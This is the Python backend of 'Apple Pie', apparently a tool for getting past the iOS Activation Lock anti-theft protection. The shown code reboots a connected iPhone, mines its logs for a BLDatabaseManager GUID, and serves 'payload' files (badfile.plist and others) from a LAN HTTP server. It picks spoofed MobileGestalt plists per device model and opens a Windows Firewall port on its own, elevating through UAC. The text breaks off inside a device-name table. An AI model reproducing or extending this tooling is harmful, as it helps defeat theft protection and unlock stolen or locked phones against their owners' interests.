# -*- coding: utf-8 -*-
# Apple Pie -- pure Python backend.
#
# The Flask WebUI (webui.py + web/) is the ONLY interface. This module holds
# all of the logic (device detection, GUID search, local payload generation,
# AFC deployment) and mirrors its state into web_state, which the browser
# renders over Flask + JSON.

import asyncio
import ctypes
import os
import threading
import time
import subprocess
from art import text2art
import sys
import re
import shutil
import socket
import sqlite3
import atexit
import requests
from pathlib import Path
from typing import Optional, List, Tuple
from pymobiledevice3.services.os_trace import OsTraceService
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.lockdown import create_using_usbmux
import tempfile
import secrets
import zipfile
import functools
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler

ctypes.windll.shcore.SetProcessDpiAwareness(0)

version = "0.1.0"

onlyFindGuid = False


def _root_dir() -> str:
    """Bundle root: sys._MEIPASS when frozen (PyInstaller/Nuitka onefile),
    otherwise the folder containing this module. All asset lookups agree on one."""
    return getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))

# Shared state mirror for the WebUI. The browser polls /api/status and renders
# this dict; the engine updates it at every chokepoint (logs / progress /
# popups / device fields / phase).
web_state = {
    "phase": "intro",
    "status": "Starting...",
    "connected": False,
    "scan_paused": False,
    "device_name": "",
    "device_info": "",
    "udid": "",
    "activation": "",
    "ios": "",
    "supported": False,
    "progress": 0,
    "busy": False,
    "unlock_disabled": False,
    "unlock_text": "Unlock",
    "logs": [],
    "popup": {"visible": False, "title": "", "message": "", "button": "Close"},
    "loading": {"visible": False, "message": ""},
}
_web_lock = threading.Lock()


def _web_update(**kw):
    with _web_lock:
        web_state.update(kw)


print(text2art("Apple Pie"))
print("==> Version 0.1.0 Release <==")
print("--------------------------------------------------")


def _resource(name: str) -> str:
    candidates = []
    if hasattr(sys, "_MEIPASS"):
        candidates.append(sys._MEIPASS)
    if getattr(sys, "frozen", False) or hasattr(sys, "executable"):
        candidates.append(os.path.dirname(os.path.abspath(sys.executable)))
    candidates.append(os.path.dirname(os.path.abspath(__file__)))
    candidates.append(os.getcwd())

    for base in candidates:
        p = os.path.join(base, "bin", name)
        if os.path.exists(p):
            return p
    return os.path.join(_root_dir(), "bin", name)


def _data(name: str) -> str:
    candidates = []
    if hasattr(sys, "_MEIPASS"):
        candidates.append(sys._MEIPASS)
    if getattr(sys, "frozen", False) or hasattr(sys, "executable"):
        candidates.append(os.path.dirname(os.path.abspath(sys.executable)))
    candidates.append(os.path.dirname(os.path.abspath(__file__)))
    candidates.append(os.getcwd())

    for base in candidates:
        p = os.path.join(base, "data", name)
        if os.path.exists(p):
            return p
    return os.path.join(_root_dir(), "data", name)


class ApplePieEngine(object):
    def __init__(self):
        self.api_host = self.get_local_host()
        self.PAYLOAD_PORT = 8001
        self._payload_port = self.PAYLOAD_PORT
        self._httpd = None
        self._scan_paused = False
        self.device_info = {}
        self.guid = None
        # Placeholder only - overwritten from the device's real ProductVersion as
        # soon as a device is found. NOT an upper bound: any iOS newer than the
        # newest version-specific dump still resolves, via the generic dump for
        # the ProductType or the nearest version dump.
        self.iOS = None
        self.CREATE_NO_WINDOW = 0x08000000
        self.POST_CONNECT_DELAY = 12
        # Sanity floor for a collected log archive. This only asks "did the device
        # give us anything at all" - it must stay far below the size_limit passed
        # to OsTraceService.collect(), or every collection looks like a failure.
        self.MIN_ARCHIVE_SIZE = 50_000
        # pymobiledevice3 semantics: size_limit is BYTES, age_limit is DAYS.
        self.SYSLOG_SIZE_LIMIT = 50_000_000
        self.SYSLOG_AGE_LIMIT = 1
        self.GUID_REGEX = re.compile(rb'[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}')
        self.BLDB_PATTERNS_UPPER = [b"BLDATABASEMANAGER.SQLITE", b"BLDATABASEMANAGER", b"BLDATABASE"]

        self._busy = False
        self._guid_error = ""
        self._device_flow_done = False
        self._last_idevout = None  # (timestamp, raw ideviceinfo output) seen by the scan thread
        self._last_probe_ts = 0.0  # throttle: at most one real ideviceinfo spawn / 5 s
        # pymobiledevice3 >= 10 is async-only (create_using_usbmux, AfcService.connect,
        # AfcService.pull, OsTraceService.collect are all coroutines), while the rest of
        # the engine is synchronous. A single private loop bridges the two; it is
        # created lazily and reused so connections are not bound to a dead loop.
        self._loop = None

        atexit.register(self._cleanup)

    def start(self):
        """Start the background device-search thread (browser poll sees it)."""
        threading.Thread(target=self.SearchingForDevices, daemon=True).start()

    def pause_scan(self):
        """Block the device-search thread while the intro requirements popup
        is open - no ideviceinfo polls, no state writes until it is resumed."""
        self._scan_paused = True
        _web_update(scan_paused=True)

    def resume_scan(self):
        self._scan_paused = False
        _web_update(scan_paused=False)

    def _web(self, **kw):
        _web_update(**kw)

    def _log(self, text):
        if text:
            with _web_lock:
                web_state["logs"].append(text)
                if len(web_state["logs"]) > 500:
                    web_state["logs"] = web_state["logs"][-500:]

    def setProgress(self, progress: float):
        _web_update(progress=progress)

    def get_local_host(self) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            host = sock.getsockname()[0]
            sock.close()
            return host
        except Exception:
            return "127.0.0.1"


    def run_short_command(self, cmd: List[str], timeout: Optional[int] = None) -> Tuple[int, str, str]:
        try:
            env = os.environ.copy()
            bin_candidates = [
                os.path.join(_root_dir(), "bin"),
                os.path.join(os.path.dirname(os.path.abspath(sys.executable)), "bin"),
                os.path.join(os.path.dirname(os.path.abspath(__file__)), "bin"),
                os.path.join(os.getcwd(), "bin"),
                os.path.join(_root_dir(), "bin", "libimobiledevice"),
                os.path.join(os.path.dirname(os.path.abspath(sys.executable)), "bin", "libimobiledevice"),
            ]
            for b in bin_candidates:
                if os.path.isdir(b):
                    env["PATH"] = b + os.pathsep + env["PATH"]
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                startupinfo=si,
                creationflags=self.CREATE_NO_WINDOW,
                env=env
            )
            return result.returncode, result.stdout.strip(), result.stderr.strip()
        except subprocess.TimeoutExpired:
            return 124, "", "Command timed out"
        except Exception as e:
            return 1, "", str(e)


    def ideviceinfo_cmd(self, *args) -> List[str]:
        exe = _resource("libimobiledevice/ideviceinfo.exe")
        return [exe, *args] if exe else ["ideviceinfo.exe", *args]


    def idevicediagnostics_cmd(self, *args) -> List[str]:
        exe = _resource("libimobiledevice/idevicediagnostics.exe")
        return [exe, *args] if exe else ["idevicediagnostics.exe", *args]


    def restart_device(self) -> bool:
        self._log("[*] Rebooting device...")
        code, _, _ = self.run_short_command(self.idevicediagnostics_cmd("restart"), timeout=30)
        return code == 0


    def wait_for_device(self, timeout: int = 65) -> bool:
        """Poll ideviceinfo until a device is back. ideviceinfo returns exit 0
        even when it has no device, so readiness is judged on the OUTPUT, not
        the return code (the old exit-code-only check could false-positive)."""
        start = time.time()
        while time.time() - start < timeout:
            code, out, _ = self.run_short_command(self.ideviceinfo_cmd(), timeout=10)
            if code == 0 and "ERROR:" not in out and "No device found" not in out:
                udid_code, udid_out, _ = self.run_short_command(self.ideviceinfo_cmd("-k", "UniqueDeviceID"), timeout=10)
                if udid_code == 0 and udid_out.strip():
                    self._log("[*] Device connected!")
                    time.sleep(self.POST_CONNECT_DELAY)
                    return True
            time.sleep(4)
        self._log("[*] Device did not reconnected!")
        return False


    def collect_syslog_archive(self, archive_path: Path) -> bool:
        self._log("[*] Collecting device logs ...")

        async def _collect(dest: str) -> None:
            # 10.x: create_using_usbmux and OsTraceService are coroutines /
            # async context managers only - there is no synchronous __enter__.
            lockdown = await create_using_usbmux()
            try:
                async with OsTraceService(lockdown) as os_trace:
                    await os_trace.collect(out=dest, size_limit=self.SYSLOG_SIZE_LIMIT,
                                           age_limit=self.SYSLOG_AGE_LIMIT)
            finally:
                await lockdown.close()

        with tempfile.TemporaryDirectory() as tmpdir:
            log_archive = Path(tmpdir) / "syslog.logarchive"
            try:
                self._run_async(_collect(str(log_archive)))
                if not log_archive.exists():
                    return False
                archive_path.mkdir(parents=True, exist_ok=True)
                if log_archive.is_file():
                    shutil.copy2(log_archive, archive_path / "syslog.logarchive")
                elif log_archive.is_dir():
                    for item in log_archive.rglob("*"):
                        if item.is_file():
                            rel = item.relative_to(log_archive)
                            dst = archive_path / rel
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(item, dst)
                total_size = sum(f.stat().st_size for f in archive_path.rglob("*") if f.is_file())
                if total_size < self.MIN_ARCHIVE_SIZE:
                    self._guid_error = (f"log archive only {total_size} bytes "
                                        f"(need {self.MIN_ARCHIVE_SIZE})")
                    self._log(f"[*] Collected archive is only {total_size} bytes "
                              f"(need {self.MIN_ARCHIVE_SIZE}) - treating as failed")
                    return False
                self._log(f"[*] Collected {total_size:,} bytes of device logs.".replace(",", " "))
                return True
            except Exception as e:
                self._guid_error = f"syslog collection error: {e}"
                self._log(f"[*] Log collection failed! {e}")
                return False


    def extract_guid_from_archive(self, archive_path: Path) -> Optional[str]:
        exe = _resource("dependencies/unifiedlog_iterator.exe")
        cmd = [exe, "--mode", "log-archive", "--input", str(archive_path), "--format", "jsonl"]
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            text=False,
            bufsize=4 * 1024 * 1024,
            startupinfo=startupinfo,
            creationflags=self.CREATE_NO_WINDOW
        )

        buf = bytearray()
        scan_pos = 0
        lines_scanned = 0
        pattern_hits = 0

        try:
            while proc.poll() is None:
                chunk = proc.stdout.read(4 * 1024 * 1024)
                if not chunk:
                    break
                buf.extend(chunk)
                while True:
                    nl = buf.find(b"\n", scan_pos)
                    if nl == -1:
                        if scan_pos > 0:
                            del buf[:scan_pos]
                            scan_pos = 0
                        break
                    start, end = scan_pos, nl
                    scan_pos = nl + 1
                    lines_scanned += 1
                    segment = buf[start:end].upper()
                    if not any(pat in segment for pat in self.BLDB_PATTERNS_UPPER):
                        continue
                    pattern_hits += 1
                    # Prefer a v4-shaped UUID, but do not fail the whole run when
                    # iOS logs a different UUID shape on that line - any well-formed
                    # UUID next to a BLDatabaseManager mention is a usable hit.
                    v4_hit = None
                    other_hit = None
                    for cand in self.GUID_REGEX.finditer(buf[start:end]):
                        try:
                            text = cand.group(0).decode("ascii").upper()
                        except UnicodeDecodeError:
                            continue
                        parts = text.split('-')
                        if len(parts) != 5 or len(parts[0]) != 8 or \
                        any(len(p) != 4 for p in parts[1:4]) or len(parts[4]) != 12 or \
                        any(c not in '0123456789ABCDEF' for c in text.replace('-', '')):
                            continue
                        if parts[2].startswith('4') and parts[3][0] in '89AB':
                            v4_hit = text
                            break
                        if other_hit is None:
                            other_hit = text
                    guid = v4_hit or other_hit
                    if guid:
                        if not v4_hit:
                            self._log(f"[*] Log line had no v4 UUID; using {guid} instead.")
                        if proc.poll() is None:
                            proc.terminate()
                            try:
                                proc.wait(timeout=3)
                            except Exception:
                                proc.kill()
                        return guid
            self._guid_error = (f"no GUID found in {lines_scanned} log lines "
                                f"({pattern_hits} BLDatabase matches)")
            self._log(f"[*] GUID not found in log archive "
                       f"({lines_scanned} lines scanned, {pattern_hits} BLDatabase hits)")
            return None
        finally:
            if proc.poll() is None:
                proc.kill()


    def get_guid_auto(self) -> Optional[str]:
        for attempt in range(1, 4):
            self._log(f"[*] Attempt {attempt} / 3")
            if not (self.restart_device() and self.wait_for_device()):
                self._guid_error = "device did not reconnect after restart"
                self._log("[*] Could not connect to device!")
                return None
            with tempfile.TemporaryDirectory() as tmpdir:
                archive = Path(tmpdir) / "logs"
                if not self.collect_syslog_archive(archive):
                    self._log("[*] Log collection failed!")
                    if attempt < 3:
                        time.sleep(10)
                    continue
                guid = self.extract_guid_from_archive(archive)
                if guid:
                    return guid
                self._log("[*] Could not get GUID!")
                if attempt < 3:
                    time.sleep(10)
        self._log("[*] Error while searching GUID!")
        return None



    ## Bypass Code

    @staticmethod
    def _run_cmd(cmd, timeout=None):
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            res = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                startupinfo=si,
                creationflags=0x08000000
            )
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired:
            return 124, "", "Timeout"
        except Exception as e:
            return 1, "", str(e)


    def reboot_device(self) -> bool:
        """Reboot the device and wait until it is really back.

        Uses the standalone libimobiledevice idevicediagnostics for the restart
        (no pymobiledevice3.exe shim, no interactive input()) and polls
        ideviceinfo output for readiness instead of trusting its exit code.
        """
        self._log("[*] Rebooting device...")
        if not self.restart_device():
            self._log("[*] Reboot command failed!")
            return False

        for i in range(60):  # 60 attempts x 5 seconds = 5 minutes
            time.sleep(5)
            code, out, err = self._run_cmd(self.ideviceinfo_cmd())
            if code == 0 and "No device found" not in out and "ERROR:" not in out:
                self._log("[*] Device reconnected!")
                # Give the device extra time for a full boot
                time.sleep(10)
                return True
            if i % 6 == 0:  # Every 30 seconds
                self._log("[*] Waiting for device to come back...")

        self._log("[*] Device did not come back in time!")
        return False

    def _cleanup(self):
        """Ensure cleanup on exit"""
        self._stop_payload_server()

    def _probe_device(self) -> Optional[str]:
        """Throttled ideviceinfo probe that also refreshes the shared cache.

        A no-device ideviceinfo run takes ~5s, so at most one real spawn happens
        every 5s; the scan thread keeps the cache hot and all pre-flight checks
        (check_requirements, intro checks) reuse it instead of re-blocking ~5s.
        """
        now = time.time()
        if now - self._last_probe_ts < 5:
            return self._last_idevout[1] if self._last_idevout else None
        self._last_probe_ts = now
        code, out, _ = self.run_short_command(self.ideviceinfo_cmd(), timeout=10)
        if code == 0 and out and "No device found" not in out and "ERROR:" not in out:
            self._last_idevout = (now, out)
            return out
        self._last_idevout = None
        return None

    @staticmethod
    def _idevice_value(output: str, key: str) -> str:
        """Pull one 'Key: value' field out of ideviceinfo output, or '' if absent.

        An activation-locked / not-yet-activated device reports only a subset of
        lockdown values - DeviceName and ActivationState in particular are missing
        until the device is set up, and an unactivated device may omit others.
        A bare output.split(key + ': ')[1] therefore raises IndexError on exactly
        the devices this tool exists to service, so every lookup must be optional.
        """
        marker = "%s: " % key
        if marker in output:
            return output.split(marker, 1)[1].split("\n", 1)[0].strip()
        return ""

    class _QuietHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

    def _start_payload_server(self) -> bool:
        """Start a tiny local HTTP server serving generated payloads over the LAN."""
        if self._httpd is not None:
            return True
        root = _data("staging")
        os.makedirs(root, exist_ok=True)
        handler = functools.partial(self._QuietHandler, directory=root)
        for port in range(self.PAYLOAD_PORT, self.PAYLOAD_PORT + 10):
            try:
                self._httpd = ThreadingHTTPServer(("0.0.0.0", port), handler)
                self._httpd.daemon_threads = True
                break
            except OSError:
                self._httpd = None
        if self._httpd is None:
            return False
        self._payload_port = port
        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()
        return True

    def _stop_payload_server(self):
        if self._httpd is not None:
            try:
                self._httpd.shutdown()
                self._httpd.server_close()
            except Exception:
                pass
            self._httpd = None

    def check_requirements(self):
        """Pre-flight checks for the WebUI "Check Requirements" popup.

        Returns {"all_passed": bool, "checks": [{"name", "passed", "detail"}, ...]}.
        Never raises - every check degrades to a readable failure so the UI
        always has something to show. Runs the same tools as the real flow
        (ideviceinfo, Maker plist lookup, embedded payload server).
        """
        checks = []

        prd = ver = None
        detail = "No device found - connect your iPhone via USB."
        output = self._probe_device()
        if output and "ERROR: No device found!" not in output:
            prd = self._idevice_value(output, "ProductType")
            ver = self._idevice_value(output, "ProductVersion")
            name = self._idevice_value(output, "DeviceName") or "iPhone"
            if prd:
                detail = f"{name} ({prd}) - iOS {ver or 'Unknown'}"
        checks.append({"name": "Device connected", "passed": prd is not None, "detail": detail})

        if prd:
            supported = self.is_device_supported(prd, ver)
            checks.append({
                "name": "Device supported",
                "passed": supported,
                "detail": (f"Payload data found for {prd} / iOS {ver}."
                           if supported else f"No payload data for {prd} / iOS {ver}."),
            })
        else:
            checks.append({"name": "Device supported", "passed": False,
                           "detail": "Waiting for a connected device."})

        server_ok = False
        port = self._payload_port
        server_detail = "Local payload server could not be started."
        try:
            if self._start_payload_server():
                port = self._payload_port
                r = requests.get(f"http://127.0.0.1:{port}/", timeout=3)
                server_ok = True
                server_detail = f"Running on port {port} (HTTP {r.status_code})."
        except Exception as e:
            server_detail = f"Payload server check error: {e}"
        checks.append({"name": "Payload server", "passed": server_ok, "detail": server_detail})

        lan_ok = False
        lan_detail = "LAN IP could not be resolved - the phone cannot fetch payloads."
        try:
            if self.api_host != "127.0.0.1" and server_ok:
                r = requests.get(f"http://{self.api_host}:{port}/", timeout=3)
                lan_ok = True
                lan_detail = (f"http://{self.api_host}:{port} responds - "
                          "connect the phone via USB and keep it on the same Wi-Fi to fetch payloads.")
            elif not server_ok:
                lan_detail = "Payload server not running - resolve that first."
        except Exception:
            lan_detail = (f"http://{self.api_host}:{port} did not respond - "
                          "check firewall / LAN IP.")
        checks.append({"name": "LAN reachability", "passed": lan_ok, "detail": lan_detail})

        return {"all_passed": all(c["passed"] for c in checks), "checks": checks}

    def _firewall_port(self) -> int:
        """The port the embedded payload server actually uses (or will use).

        The server binds PAYLOAD_PORT first and only falls back to higher ports
        when 8001 is taken; the firewall rule must open the port it is really
        listening on, not a hardcoded 8001."""
        return getattr(self, "_payload_port", None) or self.PAYLOAD_PORT

    def _firewall_rule_status(self):
        """Check whether the ApplePie inbound-TCP firewall rule exists and
        matches the active payload port.

        Returns {"present": bool, "detail": str}. Uses netsh (exit 0 = rule found).
        Never raises.
        """
        port = self._firewall_port()
        detail = f"Windows Firewall rule 'ApplePie' not found (inbound TCP {port})."
        present = False
        try:
            code, out, err = ApplePieEngine._run_cmd(
                ["netsh", "advfirewall", "firewall", "show", "rule", 'name="ApplePie"'])
            if code == 0 and "Rule Name:" in out:
                present = True
                detail = f"Windows Firewall rule 'ApplePie' active (inbound TCP {port} allow)."
                if "Enabled:" in out:
                    enabled = "Yes" in out.split("Enabled:")[1].splitlines()[0]
                    action_ok = "Action:" in out and "Allow" in out.split("Action:")[1].splitlines()[0]
                    rule_port = None
                    if "LocalPort:" in out:
                        rule_port = out.split("LocalPort:")[1].splitlines()[0].strip()
                    if not enabled:
                        detail = "Windows Firewall rule 'ApplePie' exists but is disabled."
                    elif not action_ok:
                        detail = "Windows Firewall rule 'ApplePie' exists but does not allow the port."
                    elif rule_port and rule_port != str(port):
                        detail = (f"Windows Firewall rule 'ApplePie' opens TCP {rule_port} "
                                  f"but the payload server listens on {port}.")
        except Exception as e:
            detail = f"Firewall check error: {e}"
        return {"present": present, "detail": detail}

    def apply_firewall_rule(self):
        """Create the ApplePie inbound TCP <payload port> Windows Firewall rule.

        Returns {"ok": bool, "detail": str}. Runs netsh (needs administrator
        rights to create the rule); verifies the rule afterwards. Never raises.
        """
        port = self._firewall_port()
        detail = ""
        try:
            code, out, err = ApplePieEngine._run_cmd(
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 'name="ApplePie"', "dir=in", "action=allow",
                 "protocol=TCP", f"localport={port}"])
            if code == 0 and "Ok" in out:
                detail = f"Firewall rule created: inbound TCP {port} is now allowed."
            else:
                low = (out + " " + err).lower()
                if "elevation" in low or "administrator" in low or "access is denied" in low:
                    detail = ("Could not create the rule (needs administrator rights). "
                              "Run Apple Pie as Administrator and press Apply again.")
                else:
                    detail = f"Firewall rule creation failed: {out or err}".strip()
        except Exception as e:
            detail = f"Firewall apply error: {e}"
        status = self._firewall_rule_status()
        return {"ok": status["present"], "detail": detail or status["detail"]}

    def _is_elevated(self) -> bool:
        """True when the process already runs with administrator rights."""
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

    def _elevated_netsh_add_firewall(self, port: int) -> bool:
        """Create the firewall rule through a UAC-elevated shell.

        netsh refuses to create rules without elevation, so this retries the same
        command via ShellExecuteW "runas", which raises the UAC prompt. Returns
        True when the elevated command was started (caller re-verifies).
        """
        try:
            params = ('advfirewall firewall add rule name="ApplePie" dir=in '
                      f'action=allow protocol=TCP localport={port}')
            rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", "netsh", params, None, 0)
            return int(rc) > 32
        except Exception:
            return False

    def check_intro_requirements(self):
        """Software-side pre-flight for the intro "Check requirements" popup.

        Returns {"all_passed": bool, "checks": [{"name", "passed", "detail"}, ...]}.
        Never raises - every check degrades to a readable failure. Needs no
        device: verifies iTunes + 3uTools presence (the Apple USB driver stack
        the phone is controlled through), that every bundled payload file /
        external tool is intact and the embedded payload server can start, and
        that Windows Firewall allows inbound TCP 8001 (payload serving).
        """
        checks = []

        itunes = self._locate_app("iTunes.exe", ["iTunes"])
        if itunes:
            detail = f"Found: {itunes}"
        else:
            detail = ("iTunes not found - install it so Apple's USB drivers are "
                      "present (the device is controlled over the cable).")
        checks.append({"name": "iTunes", "passed": itunes is not None, "detail": detail})

        utools = self._locate_app("3uTools.exe", ["3uTools"])
        if utools:
            detail = f"Found: {utools}"
        else:
            detail = "3uTools not found - optional but recommended for Apple driver compatibility."
        checks.append({"name": "3uTools", "passed": utools is not None, "detail": detail})

        problems = []
        for f in ("downloads.28.png", "BLDatabaseManager.png", "badfile.plist"):
            if not os.path.isfile(_data(f)):
                problems.append(f"missing payload data: {f}")
        maker = _data("Maker")
        if not (os.path.isdir(maker) and any(os.listdir(maker))):
            problems.append("missing Maker plists (data/Maker/)")
        for f in ("libimobiledevice/ideviceinfo.exe",
                  "dependencies/unifiedlog_iterator.exe"):
            if not os.path.isfile(_resource(f)):
                problems.append(f"missing bundled tool: bin/{f}")
        pmd3_note = ""
        try:
            from importlib.metadata import version as _pkg_version
            pmd3_note = f"pymobiledevice3 {_pkg_version('pymobiledevice3')} AFC API available"
        except Exception as e:
            problems.append(f"pymobiledevice3 AFC API unavailable: {e}")
        try:
            if self._start_payload_server():
                requests.get(f"http://127.0.0.1:{self._payload_port}/", timeout=3)
            else:
                problems.append("embedded payload server failed to start")
        except Exception:
            problems.append("embedded payload server failed to start")
        if not self.api_host:
            problems.append("LAN IP not resolved")

        sw_ok = not problems
        sw_detail = ("All payload data and bundled tools are in place."
                     if sw_ok else "; ".join(problems) + ".")
        if sw_ok and pmd3_note:
            sw_detail += " " + pmd3_note + "."
        checks.append({"name": "Software requirements", "passed": sw_ok, "detail": sw_detail})

        fw = self._firewall_rule_status()
        if not fw["present"]:
            # Self-heal: create the rule automatically instead of only offering the
            # Apply button. netsh needs administrator rights, so a failed attempt is
            # retried once through a UAC-elevated shell; if that is declined the
            # manual Apply button stays available and the detail explains why.
            applied = self.apply_firewall_rule()
            if not applied["ok"] and not getattr(self, "_fw_elevate_attempted", False):
                self._fw_elevate_attempted = True
                if not self._is_elevated() and self._elevated_netsh_add_firewall(self._firewall_port()):
                    applied = self.apply_firewall_rule()
            if applied["ok"]:
                fw = self._firewall_rule_status()
            else:
                fw["detail"] = applied["detail"]
        checks.append({"name": f"Windows Firewall (port {self._firewall_port()})",
                       "passed": fw["present"], "detail": fw["detail"]})

        return {"all_passed": all(c["passed"] for c in checks), "checks": checks}

    @staticmethod
    def _locate_app(exe_name, subdirs):
        """Find an installed app by exe name across standard dirs + registry App Paths."""
        candidates = []
        for var in ("ProgramFiles", "ProgramFiles(x86)", "LocalAppData"):
            pf = os.environ.get(var, "")
            if pf:
                candidates.append(os.path.join(pf, exe_name))
                for sub in subdirs:
                    candidates.append(os.path.join(pf, sub, exe_name))
        # Apps frequently install into a versioned folder (3uTools9, 3uTools10,
        # ...), so also try "<sub>*" before falling back to the registry.
        import glob
        for var in ("ProgramFiles", "ProgramFiles(x86)", "LocalAppData"):
            pf = os.environ.get(var, "")
            if not pf:
                continue
            for sub in subdirs:
                candidates.extend(sorted(glob.glob(os.path.join(pf, sub + "*", exe_name))))
        try:
            import winreg
            for root in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
                try:
                    key = winreg.OpenKey(
                        root,
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\\" + exe_name)
                    val, _ = winreg.QueryValueEx(key, "")
                    winreg.CloseKey(key)
                    if val:
                        candidates.append(val)
                except OSError:
                    pass
        except Exception:
            pass
        for c in candidates:
            if c and os.path.isfile(c):
                return c
        return None

    @staticmethod
    def _sqlite_from_dump(dump: str, output_file: str) -> None:
        """Build a SQLite DB from an SQL dump, decoding unistr() escapes (get2.php parity)."""
        def _decode(m):
            escaped = m.group(1)
            decoded = re.sub(r'\\([0-9A-Fa-f]{4})', lambda mm: chr(int(mm.group(1), 16)), escaped)
            return "'" + decoded.replace("'", "''") + "'"
        dump = re.sub(r"""unistr\s*\(\s*['"]([^'"]*)['"]\s*\)""", _decode, dump, flags=re.I)
        dump = re.sub(r"""unistr\s*\(\s*(['"][^'"]*['"])\s*\)""", r"\1", dump, flags=re.I)
        conn = sqlite3.connect(output_file)
        try:
            for statement in dump.split(';\n'):
                statement = statement.strip()
                if statement and len(statement) > 5:
                    try:
                        conn.execute(statement + ';')
                    except sqlite3.Error:
                        pass
        finally:
            conn.commit()
            conn.close()

    @staticmethod
    def _ver_key(v) -> tuple:
        """Numeric tuple for an iOS version string ('17.3.1' -> (17, 3, 1))."""
        return tuple(int(x) for x in re.findall(r'\d+', str(v))[:4])

    def _gestalt_versions(self, prd: str) -> dict:
        """Every version-specific gestalt dump bundled for a ProductType."""
        prd_formatted = re.sub(r'[^A-Za-z0-9_\-]', '', str(prd).replace(',', '-'))
        fdir = _data(f"Maker/{prd_formatted}")
        found = {}
        if os.path.isdir(fdir):
            for entry in sorted(os.listdir(fdir)):
                epath = os.path.join(fdir, entry)
                if os.path.isdir(epath):
                    cand = os.path.join(epath, "com.apple.MobileGestalt.plist")
                    if os.path.isfile(cand):
                        found[entry] = cand
        return found

    def _resolve_gestalt(self, prd: str, ver: Optional[str] = None):
        """Pick the best bundled MobileGestalt cache for a device/iOS pair.

        Order of preference:
          1. exact version dump            Maker/<prd>/<ver>/com.apple.MobileGestalt.plist
          2. generic dump                  Maker/<prd>/com.apple.MobileGestalt.plist
          3. nearest version dump          (numeric distance, newer wins ties)

        Step 3 means no bundled gestalt is ever wasted: a model that only
        ships e.g. 17.3.1 still activates a device on 17.3 / 17.4 instead of
        being reported unsupported.

        Returns (plist_path, version_used) or (None, None); version_used is
        None when the generic (version-less) dump was chosen.
        """
        prd_formatted = re.sub(r'[^A-Za-z0-9_\-]', '', str(prd).replace(',', '-'))
        fdir = _data(f"Maker/{prd_formatted}")
        if ver:
            exact = os.path.join(fdir, str(ver), "com.apple.MobileGestalt.plist")
            if os.path.isfile(exact):
                return exact, str(ver)
        generic = os.path.join(fdir, "com.apple.MobileGestalt.plist")
        if os.path.isfile(generic):
            return generic, None
        versions = self._gestalt_versions(prd)
        if not versions:
            return None, None
        if not ver:
            best = sorted(versions, key=self._ver_key)[-1]
        else:
            want = self._ver_key(ver)

            def _score(name):
                have = self._ver_key(name)
                n = max(len(want), len(have))
                w = want + (0,) * (n - len(want))
                h = have + (0,) * (n - len(have))
                # distance first, then prefer the newer dump on a tie
                return (sum(abs(a - b) for a, b in zip(w, h)), [-x for x in h])

            best = min(versions, key=_score)
        return versions[best], best

    def is_device_supported(self, prd: str, ver: str) -> bool:
        return self._resolve_gestalt(prd, ver)[0] is not None

    def supported_devices(self) -> List[dict]:
        """Enumerate all supported devices from the bundled data/Maker tree.

        Returns a list of dicts:
          [{"product_type": "iPhone13,3", "name": "iPhone 12 Pro",
            "versions": ["17.3.1"]}, ...]
        "versions" lists the iOS versions with a dedicated gestalt dump for
        this device. A device with only a generic (version-less) dump reports
        ["All"] -- the generic dump covers the tool's supported iOS range.
        """
        import plistlib
        maker = _data("Maker")
        devices: List[dict] = []
        if not os.path.isdir(maker):
            return devices
        for folder in sorted(os.listdir(maker)):
            fdir = os.path.join(maker, folder)
            if not os.path.isdir(fdir):
                continue
            versions: List[str] = []
            plist_file = None
            for entry in sorted(os.listdir(fdir)):
                epath = os.path.join(fdir, entry)
                if os.path.isdir(epath):
                    cand = os.path.join(epath, "com.apple.MobileGestalt.plist")
                    if os.path.exists(cand):
                        versions.append(entry)
                        plist_file = plist_file or cand
                elif entry == "com.apple.MobileGestalt.plist":
                    plist_file = epath
            if plist_file is None:
                continue
            name = folder.replace('-', ',')
            try:
                with open(plist_file, "rb") as f:
                    data = plistlib.load(f)
                extra = data.get("CacheExtra", {}) or {}
                name = extra.get("Z/dqyWS6OZTRy10UcmUAhw") or \
                       extra.get("bbtR9jQx50Fv5Af/affNtA") or name
            except Exception:
                pass
            override = {
                "iPhone11-2": "iPhone XS",
                "iPhone11-6": "iPhone XS Max",
                "iPhone11-8": "iPhone XR",
                "iPhone12-1": "iPhone 11",
                "iPhone12-3": "iPhone 11 Pro",
                "iPhone12-5": "iPhone 11 Pro Max",
                "iPhone12-8": "iPhone SE (2nd gen)",
                "iPhone13-1": "iPhone 12 mini",
                "iPhone13-2": "iPhone 12",
                "iPhone13-3": "iPhone 12 Pro",
                "iPhone13-4": "iPhone 12 Pro Max",
                "iPhone14-2": "iPhone 13 Pro",
                "iPhone14-3": "iPhone 13 Pro Max",
                "iPhone14-4": "iPhone 13 mini",
                "iPhone14-5": "iPhone 13",
                "iPhone14-6": "iPhone SE (3rd gen)",
